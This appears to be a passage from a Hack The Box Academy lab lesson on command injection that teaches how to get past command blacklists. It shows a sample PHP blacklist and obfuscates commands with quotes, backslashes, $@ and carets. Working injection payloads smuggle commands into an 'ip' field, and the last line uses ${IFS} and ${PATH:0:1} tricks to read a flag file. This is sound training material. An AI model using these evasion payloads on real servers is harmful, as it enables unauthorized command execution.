
We have discussed various methods for bypassing single-character filters. However, there are different methods when it comes to bypassing blacklisted commands. A command blacklist usually consists of a set of words, and if we can obfuscate our commands and make them look different, we may be able to bypass the filters.

There are various methods of command obfuscation that vary in complexity, as we will touch upon later with command obfuscation tools. We will cover a few basic techniques that may enable us to change the look of our command to bypass filters manually.

## Commands Blacklist

We have so far successfully bypassed the character filter for the space and semi-colon characters in our payload. So, let us go back to our very first payload and re-add the `whoami` command to see if it gets executed: ![Filter Commands](https://academy.hackthebox.com/storage/modules/109/cmdinj_filters_commands_1.jpg)

A basic command blacklist filter in `PHP` would look like the following:

Code: php

```php
$blacklist = ['whoami', 'cat', ...SNIP...];
foreach ($blacklist as $word) {
    if (strpos('$_POST['ip']', $word) !== false) {
        echo "Invalid input";
    }
}
```

## Linux & Windows

The easiest to use are quotes, and they work on both Linux and Windows servers. For example, if we want to obfuscate the `whoami` command, we can insert single quotes between its characters, as follows:

```shell-session
21y4d@htb[/htb]$ w'h'o'am'i

21y4d
```

The same works with double-quotes as well:

```shell-session
21y4d@htb[/htb]$ w"h"o"am"i

21y4d
```

The important things to remember are that `we cannot mix types of quotes` and `the number of quotes must be even`. We can try one of the above in our payload (`127.0.0.1%0aw'h'o'am'i`) and see if it works:

![Filter Commands](https://academy.hackthebox.com/storage/modules/109/cmdinj_filters_commands_2.jpg)

As we can see, this method indeed works.

## Linux Only

```bash
who$@ami
w\ho\am\i
```

## Windows Only

```cmd-session
C:\htb> who^ami

21y4d
```

to get the flag: ``ip=127.0.0.1%0ac"a"t${IFS}${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt
